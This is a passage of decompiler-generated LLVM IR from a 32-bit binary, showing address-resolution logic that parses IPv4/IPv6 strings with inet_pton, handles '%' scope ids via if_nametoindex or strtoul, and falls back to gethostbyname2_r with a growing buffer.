  %v2_805cdcf = add i32 %v8_805cdbd, 4
  %v3_805cdcf = inttoptr i32 %v2_805cdcf to i32*
  store i32 %v3_805cdc9, i32* %v3_805cdcf, align 4
  %v3_805cdd2 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805cdd2, i32* %edx.global-to-local, align 4
  %v0_805cdd5 = load i32, i32* @ebx, align 4
  %v1_805cdd5 = add i32 %v0_805cdd5, 2
  %v2_805cdd5 = inttoptr i32 %v1_805cdd5 to i8*
  %v3_805cdd5 = load i8, i8* %v2_805cdd5, align 1
  %v4_805cdd5 = and i8 %v3_805cdd5, 2
  %v5_805cdd5 = icmp eq i8 %v4_805cdd5, 0
  br i1 %v5_805cdd5, label %dec_label_pc_805cde3, label %dec_label_pc_805cddb

dec_label_pc_805cddb:                             ; preds = %dec_label_pc_805cdb6
  store i32 %arg3, i32* @ecx, align 4
  %v3_805cdde = load i32, i32* %v2_805cc0e, align 4
  br label %dec_label_pc_805cde7

dec_label_pc_805cde3:                             ; preds = %dec_label_pc_805cdb6
  %v1_805cde3 = add i32 %v0_805cdd5, 1
  %v2_805cde3 = inttoptr i32 %v1_805cde3 to i8*
  %v3_805cde3 = load i8, i8* %v2_805cde3, align 1
  %v4_805cde3 = sext i8 %v3_805cde3 to i32
  br label %dec_label_pc_805cde7

dec_label_pc_805cde7:                             ; preds = %dec_label_pc_805cddb, %dec_label_pc_805cde3
  %storemerge13 = phi i32 [ %v3_805cdde, %dec_label_pc_805cddb ], [ %v4_805cde3, %dec_label_pc_805cde3 ]
  %v2_805cde7 = add i32 %v3_805cdd2, 8
  %v3_805cde7 = inttoptr i32 %v2_805cde7 to i32*
  store i32 %storemerge13, i32* %v3_805cde7, align 4
  %v3_805cdea = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805cdea, i32* %eax.global-to-local, align 4
  %v1_805cded = add i32 %v3_805cdea, 12
  %v2_805cded = inttoptr i32 %v1_805cded to i32*
  store i32 0, i32* %v2_805cded, align 4
  br label %dec_label_pc_805ce2f

dec_label_pc_805cdf6:                             ; preds = %dec_label_pc_805cdb2
  %v1_805cdf6 = add i32 %v0_805cdc9, 7
  store i32 %v1_805cdf6, i32* @ecx, align 4
  %v8_805ce05 = ptrtoint i32* %stack_var_-176 to i32
  %storemerge14193 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %storemerge14193, i32* @ebx, align 4
  %v1_805ce29194 = add i32 %v0_805cdc9, 10
  %v2_805ce29195 = inttoptr i32 %v1_805ce29194 to i8*
  %v3_805ce29196 = load i8, i8* %v2_805ce29195, align 1
  %v4_805ce29197 = icmp eq i8 %v3_805ce29196, 0
  %v1_805ce2d198 = icmp eq i1 %v4_805ce29197, false
  br i1 %v1_805ce2d198, label %dec_label_pc_805cdfe, label %dec_label_pc_805ce2f

dec_label_pc_805cdfe:                             ; preds = %dec_label_pc_805cdf6, %dec_label_pc_805cdfe
  %storemerge14.in200 = phi i32* [ %stack_var_-176, %dec_label_pc_805cdfe ], [ %stack_var_-20, %dec_label_pc_805cdf6 ]
  %v0_805ce22199 = phi i32 [ %v1_805ce22, %dec_label_pc_805cdfe ], [ %v1_805cdf6, %dec_label_pc_805cdf6 ]
  store i32 %v8_805ce05, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-176, align 4
  %v1_805ce0e = inttoptr i32 %v0_805ce22199 to i8*
  %v2_805ce0e = load i8, i8* %v1_805ce0e, align 1
  %v3_805ce0e = sext i8 %v2_805ce0e to i32
  store i32 %v3_805ce0e, i32* %edx.global-to-local, align 4
  %v1_805ce14 = add i32 %v0_805ce22199, 1
  %v2_805ce14 = inttoptr i32 %v1_805ce14 to i8*
  %v3_805ce14 = load i8, i8* %v2_805ce14, align 1
  %v4_805ce14 = sext i8 %v3_805ce14 to i32
  store i32 %v4_805ce14, i32* %edx.global-to-local, align 4
  %v1_805ce22 = add i32 %v0_805ce22199, 7
  store i32 %v1_805ce22, i32* @ecx, align 4
  store i32 %v8_805ce05, i32* %storemerge14.in200, align 4
  store i32 %v8_805ce05, i32* @ebx, align 4
  %v1_805ce29 = add i32 %v0_805ce22199, 10
  %v2_805ce29 = inttoptr i32 %v1_805ce29 to i8*
  %v3_805ce29 = load i8, i8* %v2_805ce29, align 1
  %v4_805ce29 = icmp eq i8 %v3_805ce29, 0
  %v1_805ce2d = icmp eq i1 %v4_805ce29, false
  br i1 %v1_805ce2d, label %dec_label_pc_805cdfe, label %dec_label_pc_805ce2f

dec_label_pc_805ce2f:                             ; preds = %dec_label_pc_805cdf6, %dec_label_pc_805cdfe, %dec_label_pc_805cd4f, %dec_label_pc_805cca1, %dec_label_pc_805cde7, %dec_label_pc_805cd91
  %v3_805ce2f = load i8*, i8** %stack_var_4, align 4
  %v5_805ce2f = icmp eq i8* %v3_805ce2f, null
  %v12_805d1ca = ptrtoint i32* %stack_var_-236 to i32
  %v2_805d1cd = ptrtoint i32* %stack_var_-221 to i32
  store i32 %v2_805d1cd, i32* %eax.global-to-local, align 4
  br i1 %v5_805ce2f, label %dec_label_pc_805d1ca, label %dec_label_pc_805ce39

dec_label_pc_805ce39:                             ; preds = %dec_label_pc_805ce2f
  %v8_805ce40 = ptrtoint i32* %stack_var_-224 to i32
  store i32 %v8_805ce40, i32* %stack_var_-24, align 4
  %v1_805ce50 = add i32 %v8_805ce40, 24
  %v2_805ce50 = inttoptr i32 %v1_805ce50 to i32*
  store i32 0, i32* %v2_805ce50, align 4
  %v3_805ce57 = load i32, i32* %stack_var_-24, align 4
  %v1_805ce5a = inttoptr i32 %v3_805ce57 to i32*
  store i32 0, i32* %v1_805ce5a, align 4
  %v0_805ce60 = load i32, i32* @esi, align 4
  %v3_805ce61 = load i32, i32* %stack_var_-24, align 4
  %v1_805ce64 = add i32 %v3_805ce61, 8
  store i32 %v1_805ce64, i32* %eax.global-to-local, align 4
  %v3_805ce68 = load i8*, i8** %stack_var_4, align 4
  %v4_805ce68 = ptrtoint i8* %v3_805ce68 to i32
  store i8* inttoptr (i32 2 to i8*), i8** %stack_var_-252, align 4
  %v5_805ce6d = call i32 @inet_pton(i32 2, i8* %v3_805ce68, i32 %v1_805ce64)
  store i32 %v5_805ce6d, i32* %eax.global-to-local, align 4
  %tmp155 = icmp slt i32 %v5_805ce6d, 1
  br i1 %tmp155, label %dec_label_pc_805ce9f, label %dec_label_pc_805ce79

dec_label_pc_805ce79:                             ; preds = %dec_label_pc_805ce39
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v3_805ce7c = load i32, i32* %v2_805cbce, align 4
  store i32 %v3_805ce7c, i32* %eax.global-to-local, align 4
  %v1_805ce7f = icmp eq i32 %v3_805ce7c, 0
  br i1 %v1_805ce7f, label %dec_label_pc_805ce95, label %dec_label_pc_805ce83

dec_label_pc_805ce83:                             ; preds = %dec_label_pc_805ce79
  %v9_805ce83 = icmp eq i32 %v3_805ce7c, 2
  br i1 %v9_805ce83, label %dec_label_pc_805ce95, label %dec_label_pc_805ce88

dec_label_pc_805ce88:                             ; preds = %dec_label_pc_805ce83
  %v3_805ce88 = load i32, i32* %stack_var_-156, align 4
  %v4_805ce88 = icmp eq i32 %v3_805ce88, 0
  br i1 %v4_805ce88, label %dec_label_pc_805d50d, label %dec_label_pc_805ce95

dec_label_pc_805ce95:                             ; preds = %dec_label_pc_805ce88, %dec_label_pc_805ce83, %dec_label_pc_805ce79
  %v3_805ce95 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805ce95, i32* %eax.global-to-local, align 4
  %v1_805ce98 = add i32 %v3_805ce95, 4
  %v2_805ce98 = inttoptr i32 %v1_805ce98 to i32*
  store i32 2, i32* %v2_805ce98, align 4
  br label %dec_label_pc_805ce9f

dec_label_pc_805ce9f:                             ; preds = %dec_label_pc_805ce39, %dec_label_pc_805ce95
  %v3_805ce9f = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805ce9f, i32* %eax.global-to-local, align 4
  %v1_805cea2 = add i32 %v3_805ce9f, 4
  %v2_805cea2 = inttoptr i32 %v1_805cea2 to i32*
  %v3_805cea2 = load i32, i32* %v2_805cea2, align 4
  %v4_805cea2 = icmp eq i32 %v3_805cea2, 0
  %v1_805cea6 = icmp eq i1 %v4_805cea2, false
  br i1 %v1_805cea6, label %dec_label_pc_805cf8f, label %dec_label_pc_805ceac

dec_label_pc_805ceac:                             ; preds = %dec_label_pc_805ce9f
  %tmp156 = bitcast i8** %stack_var_4 to i32*
  %v3_805ceaf6 = load i32, i32* %tmp156, align 4
  %tmp157 = bitcast i8** %stack_var_-252 to i32*
  store i32 %v3_805ceaf6, i32* %tmp157, align 4
  %v0_805ceb2.cast = inttoptr i32 %v3_805ceaf6 to i8*
  %v3_805ceb2 = call i32 @strlen(i8* %v0_805ceb2.cast)
  %v1_805ceba = add i32 %v3_805ceb2, 1
  store i32 %v1_805ceba, i32* %edx.global-to-local, align 4
  %v1_805cebd = add i32 %v3_805ceb2, 31
  %v1_805cec0 = and i32 %v1_805cebd, -16
  %v2_805cec3 = sub i32 %v12_805d1ca, %v1_805cec0
  %v1_805cec5 = add i32 %v2_805cec3, 15
  store i32 %v1_805cec5, i32* %eax.global-to-local, align 4
  %v0_805cec9 = load i32, i32* @ebx, align 4
  %v2_805cec9 = add i32 %v2_805cec3, -4
  %v3_805cec9 = inttoptr i32 %v2_805cec9 to i32*
  store i32 %v0_805cec9, i32* %v3_805cec9, align 4
  %v0_805ceca = load i32, i32* %edx.global-to-local, align 4
  %v2_805ceca = add i32 %v2_805cec3, -8
  %v3_805ceca = inttoptr i32 %v2_805ceca to i32*
  store i32 %v0_805ceca, i32* %v3_805ceca, align 4
  %v0_805cecb = load i32, i32* %eax.global-to-local, align 4
  %v1_805cecb = and i32 %v0_805cecb, -16
  store i32 %v1_805cecb, i32* %eax.global-to-local, align 4
  %v3_805cece = load i8*, i8** %stack_var_4, align 4
  %v4_805cece = ptrtoint i8* %v3_805cece to i32
  %v6_805cece = add i32 %v2_805cec3, -12
  %v7_805cece = inttoptr i32 %v6_805cece to i32*
  store i32 %v4_805cece, i32* %v7_805cece, align 4
  %v0_805ced1 = load i32, i32* %eax.global-to-local, align 4
  %v2_805ced1 = add i32 %v2_805cec3, -16
  %v3_805ced1 = inttoptr i32 %v2_805ced1 to i32*
  store i32 %v0_805ced1, i32* %v3_805ced1, align 4
  %v0_805ced2 = load i8*, i8** %stack_var_-252, align 4
  %tmp158 = bitcast i8* %v0_805ced2 to i16*
  %v5_805ced2 = call i32 @memcpy(i16* %tmp158, i32 %v4_805ce68, i32 %v1_805ce64)
  store i32 %v5_805ced2, i32* %eax.global-to-local, align 4
  %v0_805ced7 = load i32, i32* @esp, align 4
  %v1_805ced7 = inttoptr i32 %v0_805ced7 to i32*
  %v2_805ced7 = load i32, i32* %v1_805ced7, align 4
  store i32 %v2_805ced7, i32* %edx.global-to-local, align 4
  %v3_805ced7 = add i32 %v0_805ced7, 4
  %v1_805ced8 = inttoptr i32 %v3_805ced7 to i32*
  %v2_805ced8 = load i32, i32* %v1_805ced8, align 4
  store i32 %v2_805ced8, i32* @ecx, align 4
  store i32 37, i32* %v1_805ced8, align 4
  store i32 %v5_805ced2, i32* @ebx, align 4
  store i32 %v5_805ced2, i32* %v1_805ced7, align 4
  %v0_805cede = load i8*, i8** %stack_var_-252, align 4
  %v4_805cede = call i32 @__GI_strchr(i8* %v0_805cede, i32 %v4_805ce68)
  store i32 %v4_805cede, i32* %eax.global-to-local, align 4
  %v0_805cee3 = load i32, i32* @esp, align 4
  %v1_805cee3 = add i32 %v0_805cee3, 16
  store i32 %v4_805cede, i32* @esi, align 4
  %v2_805cee8 = icmp eq i32 %v4_805cede, 0
  br i1 %v2_805cee8, label %dec_label_pc_805ceef, label %dec_label_pc_805ceec

dec_label_pc_805ceec:                             ; preds = %dec_label_pc_805ceac
  %v5_805cede = inttoptr i32 %v4_805cede to i8*
  store i8 0, i8* %v5_805cede, align 1
  %v2_805ceef.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805ceef

dec_label_pc_805ceef:                             ; preds = %dec_label_pc_805ceac, %dec_label_pc_805ceec
  %v2_805ceef = phi i32 [ %v1_805cee3, %dec_label_pc_805ceac ], [ %v2_805ceef.pre, %dec_label_pc_805ceec ]
  %v3_805ceef = add i32 %v2_805ceef, -4
  %v4_805ceef = inttoptr i32 %v3_805ceef to i32*
  store i32 %v4_805cede, i32* %v4_805ceef, align 4
  %v3_805cef0 = load i32, i32* %stack_var_-24, align 4
  %v1_805cef3 = add i32 %v3_805cef0, 8
  store i32 %v1_805cef3, i32* %eax.global-to-local, align 4
  %v2_805cef6 = add i32 %v2_805ceef, -8
  %v3_805cef6 = inttoptr i32 %v2_805cef6 to i32*
  store i32 %v1_805cef3, i32* %v3_805cef6, align 4
  %v0_805cef7 = load i32, i32* @ebx, align 4
  %v2_805cef7 = add i32 %v2_805ceef, -12
  %v3_805cef7 = inttoptr i32 %v2_805cef7 to i32*
  store i32 %v0_805cef7, i32* %v3_805cef7, align 4
  %v1_805cef8 = add i32 %v2_805ceef, -16
  %v2_805cef8 = inttoptr i32 %v1_805cef8 to i32*
  store i32 10, i32* %v2_805cef8, align 4
  %v0_805cefa = load i8*, i8** %stack_var_-252, align 4
  %v1_805cefa = ptrtoint i8* %v0_805cefa to i32
  %v5_805cefa = call i32 @inet_pton(i32 %v1_805cefa, i8* %v3_805ce68, i32 %v1_805ce64)
  store i32 %v5_805cefa, i32* %eax.global-to-local, align 4
  %tmp159 = icmp slt i32 %v5_805cefa, 1
  br i1 %tmp159, label %dec_label_pc_805cf8f, label %dec_label_pc_805cf0a

dec_label_pc_805cf0a:                             ; preds = %dec_label_pc_805ceef
  store i32 %arg3, i32* @ecx, align 4
  %v3_805cf0d = load i32, i32* %v2_805cbce, align 4
  store i32 %v3_805cf0d, i32* %eax.global-to-local, align 4
  %v1_805cf10 = icmp eq i32 %v3_805cf0d, 0
  br i1 %v1_805cf10, label %dec_label_pc_805cf1d, label %dec_label_pc_805cf14

dec_label_pc_805cf14:                             ; preds = %dec_label_pc_805cf0a
  %v9_805cf14 = icmp eq i32 %v3_805cf0d, 10
  %v1_805cf17 = icmp eq i1 %v9_805cf14, false
  br i1 %v1_805cf17, label %dec_label_pc_805d50d, label %dec_label_pc_805cf1d

dec_label_pc_805cf1d:                             ; preds = %dec_label_pc_805cf14, %dec_label_pc_805cf0a
  %v3_805cf1d = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805cf1d, i32* %eax.global-to-local, align 4
  %v1_805cf22 = add i32 %v3_805cf1d, 4
  %v2_805cf22 = inttoptr i32 %v1_805cf22 to i32*
  store i32 10, i32* %v2_805cf22, align 4
  br i1 %v2_805cee8, label %dec_label_pc_805cf8f, label %dec_label_pc_805cf2b

dec_label_pc_805cf2b:                             ; preds = %dec_label_pc_805cf1d
  %v3_805cf2b = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805cf2b, i32* @ebx, align 4
  %v1_805cf2e = add i32 %v3_805cf2b, 8
  %v2_805cf2e = inttoptr i32 %v1_805cf2e to i32*
  %v3_805cf2e = load i32, i32* %v2_805cf2e, align 4
  %v1_805cf31 = and i32 %v3_805cf2e, 49407
  store i32 %v1_805cf31, i32* %eax.global-to-local, align 4
  %v9_805cf36 = icmp eq i32 %v1_805cf31, 33022
  br i1 %v9_805cf36, label %dec_label_pc_805cf4f, label %dec_label_pc_805cf3d

dec_label_pc_805cf3d:                             ; preds = %dec_label_pc_805cf2b
  %v2_805cf3d = inttoptr i32 %v1_805cf2e to i8*
  %v3_805cf3d = load i8, i8* %v2_805cf3d, align 1
  %v13_805cf3d = icmp eq i8 %v3_805cf3d, -1
  %v1_805cf41 = icmp eq i1 %v13_805cf3d, false
  br i1 %v1_805cf41, label %dec_label_pc_805cf6a, label %dec_label_pc_805cf43

dec_label_pc_805cf43:                             ; preds = %dec_label_pc_805cf3d
  %v1_805cf43 = add i32 %v3_805cf2b, 9
  %v2_805cf43 = inttoptr i32 %v1_805cf43 to i8*
  %v3_805cf43 = load i8, i8* %v2_805cf43, align 1
  %tmp = urem i8 %v3_805cf43, 16
  %v1_805cf47 = zext i8 %tmp to i32
  store i32 %v1_805cf47, i32* %eax.global-to-local, align 4
  %v9_805cf4a = icmp eq i8 %tmp, 2
  %v1_805cf4d = icmp eq i1 %v9_805cf4a, false
  br i1 %v1_805cf4d, label %dec_label_pc_805cf6a, label %dec_label_pc_805cf4f

dec_label_pc_805cf4f:                             ; preds = %dec_label_pc_805cf43, %dec_label_pc_805cf2b
  %v0_805cf4f = load i32, i32* @esp, align 4
  %v1_805cf52 = add i32 %v4_805cede, 1
  store i32 %v1_805cf52, i32* %eax.global-to-local, align 4
  %v2_805cf55 = add i32 %v0_805cf4f, -16
  %v3_805cf55 = inttoptr i32 %v2_805cf55 to i32*
  store i32 %v1_805cf52, i32* %v3_805cf55, align 4
  %v0_805cf56 = call i32 @__GI_if_nametoindex()
  %v1_805cf5b = load i32, i32* @ebx, align 4
  %v2_805cf5b = add i32 %v1_805cf5b, 24
  %v3_805cf5b = inttoptr i32 %v2_805cf5b to i32*
  store i32 %v0_805cf56, i32* %v3_805cf5b, align 4
  %v3_805cf61 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805cf61, i32* %eax.global-to-local, align 4
  %v1_805cf64 = add i32 %v3_805cf61, 24
  %v2_805cf64 = inttoptr i32 %v1_805cf64 to i32*
  %v3_805cf64 = load i32, i32* %v2_805cf64, align 4
  %v4_805cf64 = icmp eq i32 %v3_805cf64, 0
  %v1_805cf68 = icmp eq i1 %v4_805cf64, false
  br i1 %v1_805cf68, label %dec_label_pc_805cf8f, label %dec_label_pc_805cf6a

dec_label_pc_805cf6a:                             ; preds = %dec_label_pc_805cf4f, %dec_label_pc_805cf43, %dec_label_pc_805cf3d
  %v0_805cf6a = phi i32 [ %v3_805cf61, %dec_label_pc_805cf4f ], [ %v1_805cf47, %dec_label_pc_805cf43 ], [ %v1_805cf31, %dec_label_pc_805cf3d ]
  %v1_805cf6a = load i32, i32* @esp, align 4
  %v2_805cf6a = add i32 %v1_805cf6a, -4
  %v3_805cf6a = inttoptr i32 %v2_805cf6a to i32*
  store i32 %v0_805cf6a, i32* %v3_805cf6a, align 4
  %v2_805cf6b = ptrtoint i8** %stack_var_-32 to i32
  %v1_805cf6e = add i32 %v1_805cf6a, -8
  %v2_805cf6e = inttoptr i32 %v1_805cf6e to i32*
  store i32 10, i32* %v2_805cf6e, align 4
  %v2_805cf70 = add i32 %v1_805cf6a, -12
  %v3_805cf70 = inttoptr i32 %v2_805cf70 to i32*
  store i32 %v2_805cf6b, i32* %v3_805cf70, align 4
  %v1_805cf71 = add i32 %v4_805cede, 1
  store i32 %v1_805cf71, i32* %eax.global-to-local, align 4
  %v3_805cf74 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805cf74, i32* @ebx, align 4
  %v2_805cf77 = add i32 %v1_805cf6a, -16
  %v3_805cf77 = inttoptr i32 %v2_805cf77 to i32*
  store i32 %v1_805cf71, i32* %v3_805cf77, align 4
  %v0_805cf78 = load i8*, i8** %stack_var_-252, align 4
  %v1_805cf78 = ptrtoint i8* %v0_805cf78 to i32
  %v5_805cf78 = call i32 @strtoul(i32 %v1_805cf78, i32 %v4_805ce68, i32 %v1_805ce64, i32 %v0_805ce60)
  %v1_805cf7d = load i32, i32* @ebx, align 4
  %v2_805cf7d = add i32 %v1_805cf7d, 24
  %v3_805cf7d = inttoptr i32 %v2_805cf7d to i32*
  store i32 %v5_805cf78, i32* %v3_805cf7d, align 4
  %v3_805cf83 = load i8*, i8** %stack_var_-32, align 4
  %v4_805cf83 = ptrtoint i8* %v3_805cf83 to i32
  store i32 %v4_805cf83, i32* %eax.global-to-local, align 4
  %v2_805cf86 = load i8, i8* %v3_805cf83, align 1
  %v3_805cf86 = icmp eq i8 %v2_805cf86, 0
  %v1_805cf89 = icmp eq i1 %v3_805cf86, false
  br i1 %v1_805cf89, label %dec_label_pc_805d514, label %dec_label_pc_805cf8f

dec_label_pc_805cf8f:                             ; preds = %dec_label_pc_805cf6a, %dec_label_pc_805cf4f, %dec_label_pc_805cf1d, %dec_label_pc_805ceef, %dec_label_pc_805ce9f
  %v3_805cf8f = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805cf8f, i32* %eax.global-to-local, align 4
  %v1_805cf92 = add i32 %v3_805cf8f, 4
  %v2_805cf92 = inttoptr i32 %v1_805cf92 to i32*
  %v3_805cf92 = load i32, i32* %v2_805cf92, align 4
  %v4_805cf92 = icmp eq i32 %v3_805cf92, 0
  %v1_805cf96 = icmp eq i1 %v4_805cf92, false
  br i1 %v1_805cf96, label %dec_label_pc_805d1b8, label %dec_label_pc_805cf9c

dec_label_pc_805cf9c:                             ; preds = %dec_label_pc_805cf8f
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v2_805cf9f = load i8, i8* %tmp118, align 1
  %v3_805cf9f = and i8 %v2_805cf9f, 4
  %v4_805cf9f = icmp eq i8 %v3_805cf9f, 0
  %v1_805cfa2 = icmp eq i1 %v4_805cf9f, false
  br i1 %v1_805cfa2, label %dec_label_pc_805d1b8, label %dec_label_pc_805cfa8

dec_label_pc_805cfa8:                             ; preds = %dec_label_pc_805cf9c
  %v3_805cfa8 = load i32, i32* %v2_805cbce, align 4
  store i32 %v3_805cfa8, i32* %eax.global-to-local, align 4
  %v1_805cfab = icmp eq i32 %v3_805cfa8, 0
  br i1 %v1_805cfab, label %dec_label_pc_805cfbc, label %dec_label_pc_805cfaf

dec_label_pc_805cfaf:                             ; preds = %dec_label_pc_805cfa8
  %v9_805cfaf = icmp eq i32 %v3_805cfa8, 10
  br i1 %v9_805cfaf, label %dec_label_pc_805cfbc, label %dec_label_pc_805cfb4

dec_label_pc_805cfb4:                             ; preds = %dec_label_pc_805cfaf
  %v2_805cfb4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805cfb4, i32* @edi, align 4
  br label %dec_label_pc_805d094

dec_label_pc_805cfbc:                             ; preds = %dec_label_pc_805cfaf, %dec_label_pc_805cfa8
  store i32 512, i32* %ebx.global-to-local, align 4
  %v2_805cfd0 = ptrtoint i32* %stack_var_-28 to i32
  %v2_805cfd7 = ptrtoint i8** %stack_var_-32 to i32
  %v2_805cfdb = ptrtoint i32* %stack_var_-68 to i32
  %v0_805cfc9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805cfc1

dec_label_pc_805cfc1:                             ; preds = %dec_label_pc_805cff3.dec_label_pc_805cfc1_crit_edge, %dec_label_pc_805cfbc
  %v0_805cfc9 = phi i32 [ %v1_805cfeb, %dec_label_pc_805cff3.dec_label_pc_805cfc1_crit_edge ], [ %v0_805cfc9.pre, %dec_label_pc_805cfbc ]
  %v0_805cfc1 = phi i32 [ %v0_805cfc1.pre, %dec_label_pc_805cff3.dec_label_pc_805cfc1_crit_edge ], [ 512, %dec_label_pc_805cfbc ]
  %v2_805cfc1 = mul i32 %v0_805cfc1, 2
  store i32 %v2_805cfc1, i32* @ebx, align 4
  %v1_805cfc3 = add i32 %v2_805cfc1, 30
  %v1_805cfc6 = and i32 %v1_805cfc3, -16
  %v2_805cfc9 = sub i32 %v0_805cfc9, %v1_805cfc6
  %v1_805cfcb = add i32 %v2_805cfc9, 15
  store i32 %v1_805cfcb, i32* %edx.global-to-local, align 4
  %v2_805cfcf = add i32 %v2_805cfc9, -4
  %v3_805cfcf = inttoptr i32 %v2_805cfcf to i32*
  store i32 %v1_805cfc6, i32* %v3_805cfcf, align 4
  %v0_805cfd3 = load i32, i32* %edx.global-to-local, align 4
  %v1_805cfd3 = and i32 %v0_805cfd3, -16
  store i32 %v1_805cfd3, i32* %edx.global-to-local, align 4
  %v2_805cfd6 = add i32 %v2_805cfc9, -8
  %v3_805cfd6 = inttoptr i32 %v2_805cfd6 to i32*
  store i32 %v2_805cfd0, i32* %v3_805cfd6, align 4
  %v2_805cfda = add i32 %v2_805cfc9, -12
  %v3_805cfda = inttoptr i32 %v2_805cfda to i32*
  store i32 %v2_805cfd7, i32* %v3_805cfda, align 4
  store i32 %v2_805cfdb, i32* %eax.global-to-local, align 4
  %v0_805cfde = load i32, i32* @ebx, align 4
  %v2_805cfde = add i32 %v2_805cfc9, -16
  %v3_805cfde = inttoptr i32 %v2_805cfde to i32*
  store i32 %v0_805cfde, i32* %v3_805cfde, align 4
  %v0_805cfdf = load i32, i32* %edx.global-to-local, align 4
  %v2_805cfdf = add i32 %v2_805cfc9, -20
  %v3_805cfdf = inttoptr i32 %v2_805cfdf to i32*
  store i32 %v0_805cfdf, i32* %v3_805cfdf, align 4
  %v2_805cfe0 = add i32 %v2_805cfc9, -24
  %v3_805cfe0 = inttoptr i32 %v2_805cfe0 to i32*
  store i32 %v2_805cfdb, i32* %v3_805cfe0, align 4
  %v1_805cfe1 = add i32 %v2_805cfc9, -28
  %v2_805cfe1 = inttoptr i32 %v1_805cfe1 to i32*
  store i32 10, i32* %v2_805cfe1, align 4
  %v3_805cfe3 = load i8*, i8** %stack_var_4, align 4
  %v4_805cfe3 = ptrtoint i8* %v3_805cfe3 to i32
  %v6_805cfe3 = add i32 %v2_805cfc9, -32
  %v7_805cfe3 = inttoptr i32 %v6_805cfe3 to i32*
  store i32 %v4_805cfe3, i32* %v7_805cfe3, align 4
  %v0_805cfe6 = call i32 @gethostbyname2_r()
  store i32 %v0_805cfe6, i32* %eax.global-to-local, align 4
  %v0_805cfeb = load i32, i32* @esp, align 4
  %v1_805cfeb = add i32 %v0_805cfeb, 32
  %v9_805cfee = icmp eq i32 %v0_805cfe6, 34
  %v1_805cff1 = icmp eq i1 %v9_805cfee, false
  br i1 %v1_805cff1, label %dec_label_pc_805cffb, label %dec_label_pc_805cff3

dec_label_pc_805cff3:                             ; preds = %dec_label_pc_805cfc1
  %v3_805cff3 = load i32, i32* %stack_var_-28, align 4
  %v13_805cff3 = icmp eq i32 %v3_805cff3, -1
  br i1 %v13_805cff3, label %dec_label_pc_805cff3.dec_label_pc_805cfc1_crit_edge, label %dec_label_pc_805cfff

dec_label_pc_805cff3.dec_label_pc_805cfc1_crit_edge: ; preds = %dec_label_pc_805cff3
  %v0_805cfc1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805cfc1

dec_label_pc_805cffb:                             ; preds = %dec_label_pc_805cfc1
  %v1_805cffb = icmp eq i32 %v0_805cfe6, 0
  br i1 %v1_805cffb, label %dec_label_pc_805d028, label %dec_label_pc_805cffb.dec_label_pc_805cfff_crit_edge

dec_label_pc_805cffb.dec_label_pc_805cfff_crit_edge: ; preds = %dec_label_pc_805cffb
  %v3_805cfff.pre = load i32, i32* %stack_var_-28, align 4
  br label %dec_label_pc_805cfff

dec_label_pc_805cfff:                             ; preds = %dec_label_pc_805cff3, %dec_label_pc_805cffb.dec_label_pc_805cfff_crit_edge
  %v0_805d020 = phi i32 [ %v3_805cfff.pre, %dec_label_pc_805cffb.dec_label_pc_805cfff_crit_edge ], [ %v3_805cff3, %dec_label_pc_805cff3 ]
  store i32 %v0_805d020, i32* %eax.global-to-local, align 4
  %v10_805d002 = icmp eq i32 %v0_805d020, -1
  br i1 %v10_805d002, label %dec_label_pc_805d51b, label %dec_label_pc_805d00b

dec_label_pc_805d00b:                             ; preds = %dec_label_pc_805cfff
  %v9_805d00b = icmp eq i32 %v0_805d020, 2
  %v2_805d00e = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805d00e, i32* %edx.global-to-local, align 4
  %v1_805d011 = icmp eq i1 %v9_805d00b, false
  store i32 %v2_805d00e, i32* @edi, align 4
  br i1 %v1_805d011, label %dec_label_pc_805d01c, label %dec_label_pc_805d013

dec_label_pc_805d013:                             ; preds = %dec_label_pc_805d00b
  store i32 -3, i32* @ebx, align 4
  br label %dec_label_pc_805d096

dec_label_pc_805d01c:                             ; preds = %dec_label_pc_805d00b
  %v9_805d020 = icmp eq i32 %v0_805d020, 4
  %v1_805d023 = zext i1 %v9_805d020 to i32
  store i32 %v1_805d023, i32* @ebx, align 4
  br label %dec_label_pc_805d096

dec_label_pc_805d028:                             ; preds = %dec_label_pc_805cffb
  %v3_805d028 = load i8*, i8** %stack_var_-32, align 4
  %v5_805d028 = icmp eq i8* %v3_805d028, null
  %v2_805d02c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805d02c, i32* %edx.global-to-local, align 4
  %v1_805d02f = icmp eq i1 %v5_805d028, false
  store i32 %v2_805d02c, i32* @edi, align 4
  br i1 %v1_805d02f, label %dec_label_pc_805d035, label %dec_label_pc_805d094

dec_label_pc_805d035:                             ; preds = %dec_label_pc_805d028
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_805d081182 = ptrtoint i8* %v3_805d028 to i32
  store i32 %v4_805d081182, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_805d08b183 = add i32 %v4_805d081182, 16
  %v2_805d08b184 = inttoptr i32 %v1_805d08b183 to i32*
  %v3_805d08b185 = load i32, i32* %v2_805d08b184, align 4
  store i32 %v3_805d08b185, i32* %eax.global-to-local, align 4
  %v3_805d08e186 = inttoptr i32 %v3_805d08b185 to i32*
  %v4_805d08e187 = load i32, i32* %v3_805d08e186, align 4
  %v5_805d08e188 = icmp eq i32 %v4_805d08e187, 0
  %v1_805d092189 = icmp eq i1 %v5_805d08e188, false
  br i1 %v1_805d092189, label %dec_label_pc_805d03b, label %dec_label_pc_805d094

dec_label_pc_805d03b:                             ; preds = %dec_label_pc_805d035, %dec_label_pc_805d053
  %v0_805d084192 = phi i32 [ %v0_805d084.pre, %dec_label_pc_805d053 ], [ 0, %dec_label_pc_805d035 ]
